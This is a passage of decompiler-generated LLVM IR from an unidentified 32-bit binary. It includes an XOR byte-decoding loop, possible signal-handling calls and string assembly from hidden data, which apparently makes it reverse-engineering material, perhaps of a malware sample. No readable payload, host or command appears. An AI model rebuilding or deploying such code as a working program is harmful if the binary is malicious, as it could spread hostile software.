  %v2_8049605 = add i32 %v1_8049605, 4
  %v3_8049605 = inttoptr i32 %v2_8049605 to i32*
  %v4_8049605 = load i32, i32* %v3_8049605, align 4
  %v5_8049605 = add i32 %v4_8049605, %v0_8049602
  store i32 %v5_8049605, i32* %eax.global-to-local, align 4
  %v1_8049608 = inttoptr i32 %v5_8049605 to i8*
  %v2_8049608 = load i8, i8* %v1_8049608, align 1
  %v3_8049608 = xor i8 %v2_8049608, -34
  store i8 %v3_8049608, i8* %v1_8049608, align 1
  %v0_804960b = load i32, i32* %edx.global-to-local, align 4
  %v1_804960b = load i32, i32* @ebp, align 4
  %v5_804960d = icmp slt i32 %v0_804960b, %v1_804960b
  br i1 %v5_804960d, label %dec_label_pc_80495ea, label %dec_label_pc_804960b.dec_label_pc_804960f_crit_edge

dec_label_pc_804960b.dec_label_pc_804960f_crit_edge: ; preds = %dec_label_pc_80495ea
  %v2_804960f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804960f

dec_label_pc_804960f:                             ; preds = %dec_label_pc_804960b.dec_label_pc_804960f_crit_edge, %dec_label_pc_80495b0
  %v2_804960f = phi i32 [ %v2_804960f.pre, %dec_label_pc_804960b.dec_label_pc_804960f_crit_edge ], [ %v3_80495de, %dec_label_pc_80495b0 ]
  %v0_804960f = load i16, i16* @global_var_804f6a0.45, align 32
  %v1_804960f = zext i16 %v0_804960f to i32
  %v3_804960f = and i32 %v2_804960f, -65536
  %v4_804960f = or i32 %v1_804960f, %v3_804960f
  store i32 %v4_804960f, i32* %eax.global-to-local, align 4
  %v0_8049615 = load i32, i32* @edi, align 4
  %v1_8049615 = add i32 %v0_8049615, 8
  %v2_8049615 = inttoptr i32 %v1_8049615 to i32*
  store i32 0, i32* %v2_8049615, align 4
  %v0_804961c = load i32, i32* %eax.global-to-local, align 4
  %v1_804961c = add i32 %v0_804961c, 1
  %v1_804961d = trunc i32 %v1_804961c to i16
  store i16 %v1_804961d, i16* @global_var_804f6a0.45, align 32
  %v0_8049623 = load i32, i32* @global_var_804f6a8.46, align 8
  store i32 %v0_8049623, i32* %eax.global-to-local, align 4
  %v0_8049628 = load i32, i32* @edi, align 4
  store i32 %v0_8049628, i32* @global_var_804f6a8.46, align 8
  %v2_804962e = add i32 %v0_8049623, 8
  %v3_804962e = inttoptr i32 %v2_804962e to i32*
  store i32 %v0_8049628, i32* %v3_804962e, align 4
  %v2_8049634 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8049634, i32* @ebx, align 4
  store i32 %v0_80495b5, i32* @esi, align 4
  store i32 %v0_80495b4, i32* @edi, align 4
  store i32 %v0_80495b0, i32* @ebp, align 4
  ret i32 %v0_8049623

; uselistorder directives
  uselistorder i32 %v0_804960b, { 1, 0 }
  uselistorder i32 %v1_80495d0, { 1, 0, 2 }
  uselistorder i32 %v1_80495c0, { 0, 1, 3, 2 }
  uselistorder i16* @global_var_804f6a0.45, { 1, 0 }
  uselistorder label %dec_label_pc_80495ea, { 1, 0 }
}

define i32 @function_8049639() local_unnamed_addr {
dec_label_pc_8049639:
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8049639 = load i32, i32* @ebp, align 4
  %v0_804963a = load i32, i32* @edx, align 4
  store i32 %v0_804963a, i32* @ebp, align 4
  %v0_804963c = load i32, i32* @edi, align 4
  %v0_804963d = load i32, i32* @esi, align 4
  %v0_804963e = load i32, i32* @ebx, align 4
  store i32 %v0_804963e, i32* %stack_var_-16, align 4
  %v0_804963f = load i32, i32* @eax, align 4
  store i32 %v0_804963f, i32* @ebx, align 4
  %v1_804964e = add i32 %v0_804963f, 18
  store i32 %v1_804964e, i32* @esi, align 4
  %v4_8049652 = call i32 @function_804a6fc(i32 %v1_804964e, i8 0, i32 1024)
  %v2_8049657 = ptrtoint i32* %stack_var_-152 to i32
  store i32 0, i32* %stack_var_-24, align 4
  %tmp21 = bitcast i32* %stack_var_-152 to i8*
  store i1 false, i1* @df, align 1
  %v5_804967f = call i8* @_memset(i8* %tmp21, i32 0, i32 32)
  %v0_8049681 = load i32, i32* @ebx, align 4
  %v1_8049681 = add i32 %v0_8049681, 8
  %v2_8049681 = inttoptr i32 %v1_8049681 to i32*
  %v3_8049681 = load i32, i32* %v2_8049681, align 4
  %v1_8049686 = urem i32 %v3_8049681, 32
  %v2_8049689 = udiv i32 %v3_8049681, 32
  %v0_804968c = load i32, i32* @esp, align 4
  %v2_804968c = mul nuw nsw i32 %v2_8049689, 4
  %v3_804968c = add nuw nsw i32 %v2_804968c, 36
  %v4_804968c = add i32 %v3_804968c, %v0_804968c
  %v5_804968c = inttoptr i32 %v4_804968c to i32*
  %v6_804968c = load i32, i32* %v5_804968c, align 4
  %v9_804968c = shl i32 1, %v1_8049686
  %v12_804968c = or i32 %v6_804968c, %v9_804968c
  store i32 %v12_804968c, i32* %v5_804968c, align 4
  %v2_8049692 = ptrtoint i32* %stack_var_-24 to i32
  %v0_80496a3 = load i32, i32* @ebx, align 4
  %v1_80496a3 = add i32 %v0_80496a3, 8
  %v2_80496a3 = inttoptr i32 %v1_80496a3 to i32*
  %v3_80496a3 = load i32, i32* %v2_80496a3, align 4
  %v1_80496a6 = add i32 %v3_80496a3, 1
  %v5_80496a8 = call i32 @function_804b054(i32 %v1_80496a6, i32 %v2_8049657, i32 0, i32 0, i32 %v2_8049692)
  %tmp22 = icmp slt i32 %v5_80496a8, 1
  br i1 %tmp22, label %dec_label_pc_80496ec, label %dec_label_pc_80496b4

dec_label_pc_80496b4:                             ; preds = %dec_label_pc_8049639
  %v0_80496be = load i32, i32* @esi, align 4
  %v0_80496bf = load i32, i32* @ebx, align 4
  %v1_80496bf = add i32 %v0_80496bf, 8
  %v2_80496bf = inttoptr i32 %v1_80496bf to i32*
  %v3_80496bf = load i32, i32* %v2_80496bf, align 4
  %v4_80496c2 = call i32 @function_804b4a0(i32 %v3_80496bf, i32 %v0_80496be, i32 1024, i32 16384)
  %tmp23 = icmp slt i32 %v4_80496c2, 1
  br i1 %tmp23, label %dec_label_pc_80496ec, label %dec_label_pc_80496ce

dec_label_pc_80496ce:                             ; preds = %dec_label_pc_80496b4
  %v0_80496d1 = load i32, i32* @ebp, align 4
  %v1_80496d2 = call i32 @function_804a688(i32 %v0_80496d1)
  %v0_80496de = load i32, i32* @esi, align 4
  %v3_80496df = call i32 @function_804a813(i32 %v0_80496de, i32 1024, i32 %v1_80496d2)
  %v10_80496e7 = icmp eq i32 %v3_80496df, -1
  %v1_80496ea = icmp eq i1 %v10_80496e7, false
  br i1 %v1_80496ea, label %dec_label_pc_80496ee, label %dec_label_pc_80496ec

dec_label_pc_80496ec:                             ; preds = %dec_label_pc_80496ce, %dec_label_pc_80496b4, %dec_label_pc_8049639
  br label %dec_label_pc_80496ee

dec_label_pc_80496ee:                             ; preds = %dec_label_pc_80496ce, %dec_label_pc_80496ec
  %v0_80496f8 = phi i32 [ %v3_80496df, %dec_label_pc_80496ce ], [ 0, %dec_label_pc_80496ec ]
  %v2_80496f4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80496f4, i32* @ebx, align 4
  store i32 %v0_804963d, i32* @esi, align 4
  store i32 %v0_804963c, i32* @edi, align 4
  store i32 %v0_8049639, i32* @ebp, align 4
  ret i32 %v0_80496f8

; uselistorder directives
  uselistorder i32 %v3_80496df, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder label %dec_label_pc_80496ee, { 1, 0 }
}

define i32 @function_80496f9() local_unnamed_addr {
dec_label_pc_80496f9:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80496fa = load i32, i32* @edx, align 4
  store i32 %v0_80496fa, i32* %esi.global-to-local, align 4
  %v0_80496fc = load i32, i32* @ebx, align 4
  store i32 %v0_80496fc, i32* %stack_var_-8, align 4
  %v0_80496fd = load i32, i32* @eax, align 4
  store i32 %v0_80496fd, i32* @ebx, align 4
  %v2_8049704 = call i32 @function_804b0b9(i32* null)
  %v1_8049709 = load i32, i32* @ebx, align 4
  %v2_8049709 = add i32 %v1_8049709, 12
  %v3_8049709 = inttoptr i32 %v2_8049709 to i32*
  store i32 %v2_8049704, i32* %v3_8049709, align 4
  %v0_804970c = load i32, i32* %esi.global-to-local, align 4
  %v1_804970c = trunc i32 %v0_804970c to i8
  %v3_804970e = load i32, i32* @ebx, align 4
  %v4_804970e = add i32 %v3_804970e, 16
  %v5_804970e = inttoptr i32 %v4_804970e to i8*
  store i8 %v1_804970c, i8* %v5_804970e, align 1
  %v2_8049714 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049714, i32* @ebx, align 4
  %sext = mul i32 %v0_804970c, 16777216
  %v1_8049716 = sdiv i32 %sext, 16777216
  ret i32 %v1_8049716
}

define i32 @function_8049717() local_unnamed_addr {
dec_label_pc_8049717:
  %eax.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049717 = load i32, i32* @esi, align 4
  %v0_8049718 = load i32, i32* @eax, align 4
  store i32 %v0_8049718, i32* @esi, align 4
  %v0_804971a = load i32, i32* @ebx, align 4
  store i32 %v0_804971a, i32* %stack_var_-8, align 4
  %v0_804971b = load i32, i32* @edx, align 4
  %v1_804971b = trunc i32 %v0_804971b to i8
  store i32 %v0_804971b, i32* @ebx, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 0, i32* %stack_var_-28, align 4
  %v2_8049722 = call i32 @function_804b0b9(i32* null)
  store i32 %v2_8049722, i32* %eax.global-to-local, align 4
  %v0_8049728 = load i32, i32* @esi, align 4
  %v1_8049728 = add i32 %v0_8049728, 8
  %v2_8049728 = inttoptr i32 %v1_8049728 to i32*
  %v3_8049728 = load i32, i32* %v2_8049728, align 4
  store i32 %v3_8049728, i32* %stack_var_-28, align 4
  %v2_804972b = add i32 %v0_8049728, 12
  %v3_804972b = inttoptr i32 %v2_804972b to i32*
  store i32 %v2_8049722, i32* %v3_804972b, align 4
  %v0_804972e = load i32, i32* %stack_var_-28, align 4
  %v1_804972e = call i32 @function_804ae74(i32 %v0_804972e)
  store i32 %v1_804972e, i32* %eax.global-to-local, align 4
  %v2_8049736 = icmp eq i8 %v1_804971b, 0
  store i1 %v2_8049736, i1* %zf.global-to-local, align 1
  %v3_8049738 = load i32, i32* @esi, align 4
  %v4_8049738 = add i32 %v3_8049738, 17
  %v5_8049738 = inttoptr i32 %v4_8049738 to i8*
  store i8 %v1_804971b, i8* %v5_8049738, align 1
  %v0_804973b = load i32, i32* @esi, align 4
  %v1_804973b = add i32 %v0_804973b, 16
  %v2_804973b = inttoptr i32 %v1_804973b to i8*
  store i8 0, i8* %v2_804973b, align 1
  %v0_804973f = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804973f, label %dec_label_pc_8049717.dec_label_pc_8049757_crit_edge, label %dec_label_pc_8049741

dec_label_pc_8049717.dec_label_pc_8049757_crit_edge: ; preds = %dec_label_pc_8049717
  %v0_804975a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049757

dec_label_pc_8049741:                             ; preds = %dec_label_pc_8049717
  %v0_8049741 = load i32, i32* @esi, align 4
  %v1_8049741 = add i32 %v0_8049741, 1044
  %v2_8049741 = inttoptr i32 %v1_8049741 to i32*
  %v3_8049741 = load i32, i32* %v2_8049741, align 4
  store i32 %v3_8049741, i32* %eax.global-to-local, align 4
  %v1_8049747 = icmp eq i32 %v3_8049741, 0
  store i1 %v1_8049747, i1* %zf.global-to-local, align 1
  br i1 %v1_8049747, label %dec_label_pc_8049757, label %dec_label_pc_804974b

dec_label_pc_804974b:                             ; preds = %dec_label_pc_8049741
  %v0_804974b = load i32, i32* @esp, align 4
  %v9_804974b = icmp eq i32 %v0_804974b, 12
  store i1 %v9_804974b, i1* %zf.global-to-local, align 1
  store i32 %v3_8049741, i32* %stack_var_-28, align 4
  %v1_804974f = call i32 @function_804c193(i32 %v3_8049741)
  store i32 %v1_804974f, i32* %eax.global-to-local, align 4
  %v0_8049754 = load i32, i32* @esp, align 4
  %v6_8049754 = icmp eq i32 %v0_8049754, -16
  store i1 %v6_8049754, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049757

dec_label_pc_8049757:                             ; preds = %dec_label_pc_8049717.dec_label_pc_8049757_crit_edge, %dec_label_pc_8049741, %dec_label_pc_804974b
  %v0_804975a = phi i32 [ %v0_804975a.pre, %dec_label_pc_8049717.dec_label_pc_8049757_crit_edge ], [ 0, %dec_label_pc_8049741 ], [ %v1_804974f, %dec_label_pc_804974b ]
  %v2_8049758 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049758, i32* @ebx, align 4
  store i32 %v0_8049717, i32* @esi, align 4
  ret i32 %v0_804975a

; uselistorder directives
  uselistorder i32 %v3_8049741, { 1, 0, 2, 3 }
  uselistorder i8 %v1_804971b, { 1, 0 }
  uselistorder i32 %v0_804971b, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049757, { 2, 1, 0 }
}

define i32 @function_804975b() local_unnamed_addr {
dec_label_pc_804975b:
  %esi.global-to-local = alloca i32, align 4
  %v0_804975b = load i32, i32* @esi, align 4
  %v0_804975c = load i32, i32* @eax, align 4
  store i32 %v0_804975c, i32* %esi.global-to-local, align 4
  %v0_804975e = load i32, i32* @ebx, align 4
  %v0_804975f = load i32, i32* @edx, align 4
  %v1_804975f = urem i32 %v0_804975f, 65536
  store i32 %v1_804975f, i32* @ebx, align 4
  %v2_8049767 = call i32 @function_804b0b9(i32* null)
  %v0_804976f = load i32, i32* @ebx, align 4
  %v1_804976f = load i32, i32* %esi.global-to-local, align 4
  %v2_804976f = add i32 %v1_804976f, 12
  %v3_804976f = inttoptr i32 %v2_804976f to i32*
  %v4_804976f = load i32, i32* %v3_804976f, align 4
  %v5_804976f = add i32 %v4_804976f, %v0_804976f
  %v5_8049774 = icmp slt i32 %v5_804976f, %v2_8049767
  br i1 %v5_8049774, label %dec_label_pc_8049776, label %dec_label_pc_804975b.dec_label_pc_8049785_crit_edge

dec_label_pc_804975b.dec_label_pc_8049785_crit_edge: ; preds = %dec_label_pc_804975b
  br label %dec_label_pc_8049785

dec_label_pc_8049776:                             ; preds = %dec_label_pc_804975b
  store i32 %v1_804976f, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v0_804975e, i32* @ebx, align 4
  store i32 %v0_804975b, i32* @esi, align 4
  %v0_8049780 = call i32 @function_8049717()
  br label %dec_label_pc_8049785

dec_label_pc_8049785:                             ; preds = %dec_label_pc_804975b.dec_label_pc_8049785_crit_edge, %dec_label_pc_8049776
  %v0_8049788 = phi i32 [ %v2_8049767, %dec_label_pc_804975b.dec_label_pc_8049785_crit_edge ], [ %v0_8049780, %dec_label_pc_8049776 ]
  store i32 %v0_804975e, i32* @ebx, align 4
  store i32 %v0_804975b, i32* @esi, align 4
  ret i32 %v0_8049788

; uselistorder directives
  uselistorder i32 %v0_804975b, { 1, 0 }
  uselistorder i32 (i32*)* @function_804b0b9, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8049785, { 1, 0 }
}

define i32 @function_8049789(i8 %arg1) local_unnamed_addr {
dec_label_pc_8049789:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-1272 = alloca i32, align 4
  %stack_var_-2296 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-2412 = alloca i32, align 4
  %stack_var_-2396 = alloca i32, align 4
  %v0_804978a = load i32, i32* @edi, align 4
  %v0_804978c = load i32, i32* @ebx, align 4
  %v15_804978d = ptrtoint i32* %stack_var_-2396 to i32
  %v4_8049793 = zext i8 %arg1 to i32
  %v5_8049793 = load i32, i32* @eax, align 4
  %v6_8049793 = and i32 %v5_8049793, -256
  %v7_8049793 = or i32 %v6_8049793, %v4_8049793
  store i32 %v7_8049793, i32* %eax.global-to-local, align 4
  %v1_804979e = sext i8 %arg1 to i32
  %v2_804979e = call i32 @function_804aea2(i32 %v1_804979e)
  store i32 %v2_804979e, i32* %eax.global-to-local, align 4
  store i32 %v2_804979e, i32* @global_var_804f69c.44, align 4
  %tmp73 = icmp slt i32 %v2_804979e, 1
  %tmp74 = icmp eq i1 %tmp73, false
  br i1 %tmp74, label %dec_label_pc_804a549, label %dec_label_pc_80497b0

dec_label_pc_80497b0:                             ; preds = %dec_label_pc_8049789
  %v1_80497b0 = add i32 %v2_804979e, 1
  %v8_80497b0 = icmp eq i32 %v1_80497b0, 0
  store i32 %v1_80497b0, i32* %eax.global-to-local, align 4
  br i1 %v8_80497b0, label %dec_label_pc_804a549, label %dec_label_pc_80497b7

dec_label_pc_80497b7:                             ; preds = %dec_label_pc_80497b0
  %v0_80497b7 = call i32 @function_8049188()
  store i32 %v0_80497b7, i32* %eax.global-to-local, align 4
  %v0_80497bc = call i32 @function_804aec8()
  store i32 %v0_80497bc, i32* %eax.global-to-local, align 4
  store i32 84, i32* %stack_var_-2412, align 4
  store i32 %v0_80497bc, i32* @esi, align 4
  %v1_80497c8 = call i32 @function_804c630(i32 84)
  store i32 %v1_80497c8, i32* %eax.global-to-local, align 4
  store i32 %v1_80497c8, i32* @ebx, align 4
  %v1_80497da = call i32 @function_80490fc(i32 0)
  store i32 %v1_80497da, i32* @eax, align 4
  %v0_80497e2 = load i32, i32* @ebx, align 4
  store i32 %v1_80497da, i32* @edi, align 4
  %tmp75 = icmp slt i32 %v0_80497e2, 1
  br i1 %tmp75, label %dec_label_pc_8049e75, label %dec_label_pc_80497ec

dec_label_pc_80497ec:                             ; preds = %dec_label_pc_80497b7
  %v9_80497ee = icmp eq i32 %v0_80497e2, 1
  %v1_80497f1 = icmp eq i1 %v9_80497ee, false
  %v0_80497fb = load i32, i32* @esi, align 4
  %v1_80497fb = add i32 %v0_80497fb, 65436
  %v1_80497fe = select i1 %v1_80497f1, i32 1000, i32 500
  store i32 %v1_80497fe, i32* %edx.global-to-local, align 4
  %v1_8049804 = urem i32 %v1_80497fb, 65536
  store i32 %v1_8049804, i32* %eax.global-to-local, align 4
  %v7_804980d = icmp ugt i32 %v1_8049804, %v1_80497fe
  br i1 %v7_804980d, label %dec_label_pc_804980f, label %dec_label_pc_8049816

dec_label_pc_804980f:                             ; preds = %dec_label_pc_80497ec
  store i32 %v1_80497fe, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049816

dec_label_pc_8049816:                             ; preds = %dec_label_pc_80497ec, %dec_label_pc_804980f
  %stack_var_-2368.0 = phi i32 [ %v1_80497fe, %dec_label_pc_804980f ], [ %v1_8049804, %dec_label_pc_80497ec ]
  store i32 %stack_var_-2368.0, i32* %stack_var_-2412, align 4
  %v3_804982149 = zext i32 %stack_var_-2368.0 to i64
  %v4_8049821 = call i32 @function_804be6a(i64 %v3_804982149, i32 1048)
  %v2_8049839 = load i32, i32* %stack_var_-2412, align 4
  store i32 %v2_8049839, i32* @ebp, align 4
  store i32 1048, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-2412, align 4
  %v4_8049842 = call i32 @function_804be6a(i64 1, i32 2054)
  store i32 %v4_8049842, i32* @eax, align 4
  %v12_804984a = icmp eq i8 %arg1, 2
  store i32 %v4_8049842, i32* @esi, align 4
  br i1 %v12_804984a, label %dec_label_pc_8049ae0, label %dec_label_pc_8049857

dec_label_pc_8049857:                             ; preds = %dec_label_pc_8049816
  %v12_8049857 = icmp eq i8 %arg1, 3
  %v1_804985c = icmp eq i1 %v12_8049857, false
  br i1 %v1_804985c, label %dec_label_pc_8049a4d, label %dec_label_pc_8049862

dec_label_pc_8049862:                             ; preds = %dec_label_pc_8049857
  store i32 5, i32* @ecx, align 4
  %v0_8049867 = load i32, i32* @edi, align 4
  %tmp76 = urem i32 %v0_8049867, 5
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8049871 = add nuw nsw i32 %tmp76, 5
  store i32 %v1_8049871, i32* @ebx, align 4
  %v2_8049875 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_8049875, i32* %eax.global-to-local, align 4
  store i32 %v2_8049875, i32* %stack_var_-2412, align 4
  %v6_804987d = call i32 @function_8049140(i32 %v2_8049875, i32 %v1_8049871, i32 %v0_8049867, i32 %v0_8049867)
  store i32 %v6_804987d, i32* @eax, align 4
  %v0_8049882 = load i32, i32* @esp, align 4
  %v1_8049882 = load i32, i32* @ebx, align 4
  %v2_8049882 = add i32 %v0_8049882, 2324
  %v3_8049882 = add i32 %v2_8049882, %v1_8049882
  %v4_8049882 = inttoptr i32 %v3_8049882 to i8*
  store i8 0, i8* %v4_8049882, align 1
  store i32 28, i32* %stack_var_-2412, align 4
  %v2_8049891 = call i32 @function_804818a(i8 28)
  store i32 %v2_8049891, i32* @eax, align 4
  store i32 27, i32* %stack_var_-2412, align 4
  %v2_804989d = call i32 @function_804818a(i8 27)
  store i32 %v2_804989d, i32* @eax, align 4
  store i32 29, i32* %stack_var_-2412, align 4
  %v2_80498a9 = call i32 @function_804818a(i8 29)
  store i32 %v2_80498a9, i32* @eax, align 4
  store i32 30, i32* %stack_var_-2412, align 4
  %v2_80498b5 = call i32 @function_804818a(i8 30)
  store i32 %v2_80498b5, i32* @eax, align 4
  store i32 30, i32* %stack_var_-2412, align 4
  %v2_80498c1 = call i32 @function_804828b(i8 30)
  store i32 %v2_80498c1, i32* @eax, align 4
  store i32 28, i32* %stack_var_-2412, align 4
  %v2_80498d1 = call i32 @function_804828b(i8 28)
  store i32 %v2_80498d1, i32* @eax, align 4
  store i32 27, i32* %stack_var_-2412, align 4
  store i32 %v2_80498d1, i32* %edi.global-to-local, align 4
  %v2_80498df = call i32 @function_804828b(i8 27)
  store i32 %v2_80498df, i32* @eax, align 4
  store i32 29, i32* %stack_var_-2412, align 4
  store i32 %v2_80498df, i32* @ebx, align 4
  %v2_80498ed = call i32 @function_804828b(i8 29)
  store i32 %v2_80498ed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80498f6

dec_label_pc_80498f6:                             ; preds = %dec_label_pc_80499ad, %dec_label_pc_8049862
  %storemerge4 = phi i32 [ %v1_80499bd, %dec_label_pc_80499ad ], [ %v2_80498ed, %dec_label_pc_8049862 ]
  store i32 %storemerge4, i32* %eax.global-to-local, align 4
  %v0_80498f6 = load i32, i32* @ebx, align 4
  store i32 %v0_80498f6, i32* %stack_var_-2412, align 4
  %v1_80498f9 = call i32 @function_80491c6(i32 %v0_80498f6)
  store i32 %v1_80498f9, i32* %eax.global-to-local, align 4
  %v1_8049901 = icmp eq i32 %v1_80498f9, 0
  %v1_8049903 = load i32, i32* @esi, align 4
  %v2_8049903 = inttoptr i32 %v1_8049903 to i32*
  store i32 %v1_80498f9, i32* %v2_8049903, align 4
  br i1 %v1_8049901, label %dec_label_pc_80499ad, label %dec_label_pc_804990b

dec_label_pc_804990b:                             ; preds = %dec_label_pc_80498f6
  %v0_804990e = load i32, i32* @edi, align 4
  store i32 %v0_804990e, i32* %stack_var_-2412, align 4
  %v1_804990f = call i32 @function_80491c6(i32 %v0_804990e)
  store i32 %v1_804990f, i32* %eax.global-to-local, align 4
  %v1_8049917 = icmp eq i32 %v1_804990f, 0
  %v1_8049919 = load i32, i32* @esi, align 4
  %v2_8049919 = add i32 %v1_8049919, 4
  %v3_8049919 = inttoptr i32 %v2_8049919 to i32*
  store i32 %v1_804990f, i32* %v3_8049919, align 4
  br i1 %v1_8049917, label %dec_label_pc_80499ad, label %dec_label_pc_8049922

dec_label_pc_8049922:                             ; preds = %dec_label_pc_804990b
  %v0_8049922 = load i32, i32* @esi, align 4
  %v1_8049922 = inttoptr i32 %v0_8049922 to i32*
  %v2_8049922 = load i32, i32* %v1_8049922, align 4
  %v3_8049922 = icmp eq i32 %v2_8049922, 0
  br i1 %v3_8049922, label %dec_label_pc_80499ad, label %dec_label_pc_804992b

dec_label_pc_804992b:                             ; preds = %dec_label_pc_8049922
  %v2_8049932 = ptrtoint i32* %stack_var_-2296 to i32
  store i32 %v2_8049932, i32* @ebx, align 4
  store i32 %v2_8049932, i32* %stack_var_-2412, align 4
  %v3_8049937 = call i32 @function_804a6d6(i32 %v2_8049932, i32 ptrtoint ([26 x i8]* @global_var_804d3d3.47 to i32))
  %v2_804993c = load i32, i32* %stack_var_-2412, align 4
  store i32 %v2_804993c, i32* @eax, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_804d3d3.47 to i32), i32* %edx.global-to-local, align 4
  %v0_804993e = load i32, i32* @esi, align 4
  %v1_804993e = add i32 %v0_804993e, 4
  %v2_804993e = inttoptr i32 %v1_804993e to i32*
  %v3_804993e = load i32, i32* %v2_804993e, align 4
  store i32 %v2_8049932, i32* %stack_var_-2412, align 4
  %v3_8049942 = bitcast i32* %stack_var_-2296 to i8*
  %v4_8049942 = call i32 @function_804a698(i8* %v3_8049942, i32 %v3_804993e)
  store i32 %v3_804993e, i32* @eax, align 4
  store i32 %v2_8049932, i32* %stack_var_-2412, align 4
  %v4_804994f = call i32 @function_804a698(i8* %v3_8049942, i32 ptrtoint ([8 x i8]* @global_var_804d3ed.48 to i32))
  store i32 %v4_804994f, i32* @eax, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_804d3ed.48 to i32), i32* %edi.global-to-local, align 4
  %v0_8049956 = load i32, i32* @esi, align 4
  %v1_8049956 = inttoptr i32 %v0_8049956 to i32*
  %v2_8049956 = load i32, i32* %v1_8049956, align 4
  store i32 %v2_8049932, i32* %stack_var_-2412, align 4
  %v4_8049959 = call i32 @function_804a698(i8* %v3_8049942, i32 %v2_8049956)
  %v2_804995e = load i32, i32* %stack_var_-2412, align 4
  store i32 %v2_804995e, i32* @eax, align 4
  store i32 %v2_8049956, i32* %edx.global-to-local, align 4
  store i32 %v2_8049932, i32* %stack_var_-2412, align 4
  %v4_8049966 = call i32 @function_804a698(i8* %v3_8049942, i32 ptrtoint (i32* @global_var_804d3f3.49 to i32))
  store i32 ptrtoint (i32* @global_var_804d3f3.49 to i32), i32* @eax, align 4
  store i32 %v2_8049932, i32* %stack_var_-2412, align 4
  %v4_8049973 = call i32 @function_804a698(i8* %v3_8049942, i32 ptrtoint ([27 x i8]* @global_var_804d3f5.50 to i32))
  store i32 0, i32* @edi, align 4
  store i32 %v2_8049875, i32* @eax, align 4
  store i32 %v2_8049932, i32* %stack_var_-2412, align 4
  %v4_8049985 = call i32 @function_804a698(i8* %v3_8049942, i32 %v2_8049875)
  store i32 %v4_8049985, i32* %eax.global-to-local, align 4
  store i32 %v2_8049932, i32* %stack_var_-2412, align 4
  %v1_804998d = call i32 @function_804a688(i32 %v2_8049932)
  store i32 %v1_804998d, i32* @ebp, align 4
  %v2_804999e = ptrtoint i32* %stack_var_-1272 to i32
  store i32 %v2_804999e, i32* %eax.global-to-local, align 4
  store i32 %v2_804999e, i32* %stack_var_-2412, align 4
  %v6_80499a6 = call i32 @function_804a6fc(i32 %v2_804999e, i8 0, i32 1024)
  %v2_80499cc = ptrtoint i32* %stack_var_-120 to i32
  %v3_80499f8 = bitcast i32* %stack_var_-1272 to i8*
  store i32 %v6_80499a6, i32* %eax.global-to-local, align 4
  %v0_8049a00111 = load i32, i32* @edi, align 4
  %v1_8049a00112 = load i32, i32* @ebp, align 4
  store i32 %v2_8049932, i32* @esi, align 4
  %v5_8049a06114 = icmp slt i32 %v0_8049a00111, %v1_8049a00112
  br i1 %v5_8049a06114, label %dec_label_pc_80499c7, label %dec_label_pc_8049a08

dec_label_pc_80499ad:                             ; preds = %dec_label_pc_8049922, %dec_label_pc_804990b, %dec_label_pc_80498f6
  %v0_80499b0 = load i32, i32* @esi, align 4
  store i32 %v0_80499b0, i32* %stack_var_-2412, align 4
  %v1_80499b1 = call i32 @function_804c193(i32 %v0_80499b0)
  store i32 %v1_80499b1, i32* %eax.global-to-local, align 4
  store i32 300, i32* %stack_var_-2412, align 4
  %v1_80499bd = call i32 @function_804c4a7(i32 300)
  br label %dec_label_pc_80498f6

dec_label_pc_80499c7:                             ; preds = %dec_label_pc_804992b, %dec_label_pc_80499c7
  store i32 %v2_80499cc, i32* @ebx, align 4
  store i32 %v2_80499cc, i32* %stack_var_-2412, align 4
  %v6_80499d4 = call i32 @function_804a6fc(i32 %v2_80499cc, i8 0, i32 32)
  store i32 %v6_80499d4, i32* %eax.global-to-local, align 4
  %v0_80499d9 = load i32, i32* @edi, align 4
  %v1_80499d9 = load i32, i32* @esi, align 4
  %v2_80499d9 = add i32 %v1_80499d9, %v0_80499d9
  %v3_80499d9 = inttoptr i32 %v2_80499d9 to i8*
  %v4_80499d9 = load i8, i8* %v3_80499d9, align 1
  %v5_80499d9 = sext i8 %v4_80499d9 to i32
  store i32 %v5_80499d9, i32* %eax.global-to-local, align 4
  %v1_80499e0 = add i32 %v0_80499d9, 1
  store i32 %v1_80499e0, i32* @edi, align 4
  store i32 %v2_80499cc, i32* %stack_var_-2412, align 4
  %v5_80499e8 = call i32 @function_804ad34(i32 %v2_80499cc, i32 ptrtoint ([3 x i8]* @global_var_804d410.51 to i32), i32 %v5_80499d9)
  %v2_80499ed = load i32, i32* %stack_var_-2412, align 4
  store i32 %v2_80499ed, i32* @eax, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_804d410.51 to i32), i32* %edx.global-to-local, align 4
  store i32 %v2_804999e, i32* %stack_var_-2412, align 4
